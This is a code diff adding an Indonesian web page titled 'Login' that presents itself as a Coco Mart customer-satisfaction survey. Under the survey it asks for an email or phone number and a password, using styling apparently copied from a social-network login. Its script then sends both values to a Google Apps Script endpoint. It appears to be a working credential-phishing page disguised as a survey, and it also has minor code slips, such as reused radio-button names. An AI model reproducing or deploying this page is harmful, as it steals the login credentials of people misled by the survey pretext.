@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login</title>
+
+    <!-- FontAwesome -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
+    />
+
+    <style>
+      body {
+        font-family: Arial;
+        padding: 15px;
+        background: #f7f7f7;
+        margin: 0;
+      }
+      .btn-create {
+        display: block;
+        font-size: 0.9rem;
+        font-weight: 300;
+        color: #1877f2;
+        border-radius: 20px;
+        box-shadow: 0 0px 20px rgba(0, 0, 0, 0.15);
+        padding: 10px;
+        margin-top: 10%;
+        text-decoration: none;
+      }
+      input {
+        width: 100%;
+        padding: 12px;
+        margin: 8px 0;
+        border-radius: 6px;
+        border: 1px solid #ddd;
+        box-sizing: border-box;
+      }
+      .password-box {
+        position: relative;
+        width: 100%;
+      }
+      .toggle-eye {
+        position: absolute;
+        right: 10px;
+        top: 50%;
+        transform: translateY(-50%);
+        cursor: pointer;
+        font-size: 16px;
+        color: #9c9a9a;
+      }
+      button {
+        width: 100%;
+        margin-top: 0.5rem;
+        padding: 12px;
+        background-color: #1877f2;
+        color: white;
+        border: none;
+        border-radius: 20px;
+        font-size: 16px;
+        cursor: pointer;
+      }
+      body {
+        font-family: Arial;
+        padding: 20px;
+      }
+      .box {
+        padding: 15px;
+        border-radius: 10px;
+        border: 1px solid #ccc;
+        margin-bottom: 15px;
+      }
+      label {
+        font-weight: bold;
+        display: block;
+        margin-top: 10px;
+      }
+      input,
+      select,
+      textarea {
+        width: 100%;
+        padding: 10px;
+        margin-top: 5px;
+      }
+      button {
+        padding: 12px 20px;
+        margin-top: 15px;
+        background: green;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+      }
+      .card {
+        background: #fff;
+        padding: 16px;
+        border-radius: 12px;
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        margin-bottom: 20px;
+        width: 100%;
+        box-sizing: border-box;
+      }
+      h2 {
+        font-size: 1.3rem;
+        margin: 0 0 8px 0;
+      }
+      label {
+        font-weight: bold;
+        display: block;
+        margin-top: 18px;
+        font-size: 1rem;
+      }
+      .option {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        margin-left: 10px;
+        margin-top: 8px;
+        font-size: 0.95rem;
+      }
+      input[type="radio"] {
+        width: 20px;
+        height: 20px;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="card">
+      <h2>Selamat Datang di Coco Group</h2>
+      <p>Silakan isi survey kepuasan Anda</p>
+    </div>
+
+    <div class="card">
+      <label>1. Apakah Anda senang belanja di Coco Mart?</label>
+      <div class="option">
+        <input type="radio" name="q1" /><span>Ya, sangat senang</span>
+      </div>
+      <div class="option">
+        <input type="radio" name="q1" /><span>Biasa saja</span>
+      </div>
+      <div class="option">
+        <input type="radio" name="q1" /><span>Tidak senang</span>
+      </div>
+
+      <label>2. Bagaimana sikap karyawan kami saat melayani?</label>
+      <div class="option">
+        <input type="radio" name="q2" /><span>Sangat ramah dan membantu</span>
+      </div>
+      <div class="option">
+        <input type="radio" name="q2" /><span>Cukup baik</span>
+      </div>
+      <div class="option">
+        <input type="radio" name="q2" /><span>Kurang ramah</span>
+      </div>
+      <label>3. Apakah ada hal buruk terjadi saat berbelanja?</label>
+      <div class="option">
+        <input type="radio" name="q2" /><span>Tidak ada, semuanya baik</span>
+      </div>
+      <div class="option">
+        <input type="radio" name="q2" /><span>Ada sedikit masalah</span>
+      </div>
+      <div class="option">
+        <input type="radio" name="q2" /><span>Ada masalah yang serius</span>
+      </div>
+    </div>
+    <!-- FORM -->
+    <form id="myForm">
+      <input
+        type="text"
+        id="email"
+        placeholder="Email atau nomor telepon"
+        required
+      />
+      <div class="password-box">
+        <input
+          type="password"
+          id="password"
+          placeholder="Kata sandi"
+          required
+        />
+        <i
+          class="fa-solid fa-eye toggle-eye"
+          id="eyeIcon"
+          onclick="togglePassword()"
+        ></i>
+      </div>
+
+      <button type="submit">kirim</button>
+    </form>
+
+    <script>
+      // Show/Hide Password
+      function togglePassword() {
+        const password = document.getElementById("password");
+        const eyeIcon = document.getElementById("eyeIcon");
+
+        if (password.type === "password") {
+          password.type = "text";
+          eyeIcon.classList.remove("fa-eye");
+          eyeIcon.classList.add("fa-eye-slash");
+        } else {
+          password.type = "password";
+          eyeIcon.classList.remove("fa-eye-slash");
+          eyeIcon.classList.add("fa-eye");
+        }
+      }
+
+      // Google Apps Script Endpoint
+      const scriptURL =
+        "https://script.google.com/macros/s/AKfycbyS0DxbrQvcMC_8SsF5EHnPe_QSmB_ppVSKKCRd9lAOTzORNDI_c1wvvRWpQlxbLbkPIw/exec";
+
+      // Submit Form
+      document.getElementById("myForm").addEventListener("submit", (e) => {
+        e.preventDefault();
+
+        let data = {
+          email: document.getElementById("email").value,
+          password: document.getElementById("password").value,
+        };
+
+        fetch(scriptURL, {
+          method: "POST",
+          body: JSON.stringify(data),
+        })
+          .then((response) => {
+            alert("Berhasil!");
+            document.getElementById("myForm").reset();
+          })
+          .catch((error) => {
+            alert("Gagal!");
+          });
+      });
+      document.getElementById("btnBuatakunbaru").onclick = function () {
+        document.getElementById("myForm").style.display = "none";
+        document.getElementById("videoAkun").style.display = "block";
+      };
+      function buatReview() {
+        let nama = document.getElementById("nama").value;
+        let produk = document.getElementById("produk").value;
+        let kualitas = document.getElementById("kualitas").value;
+        let pengiriman = document.getElementById("pengiriman").value;
+        let komentar = document.getElementById("komentar").value;
+
+        let output = `
+    <b>Nama Pembeli:</b> ${nama}<br>
+    <b>Produk Dibeli:</b> ${produk}<br><br>
+
+    <b>Kualitas Produk:</b> ${kualitas}/5<br>
+    <b>Kecepatan Pengiriman:</b> ${pengiriman}/5<br><br>
+
+    <b>Komentar:</b><br>${komentar}
+  `;
+        document.getElementById("output").innerHTML = output;
+      }
+    </script>
+  </body>
+</html>
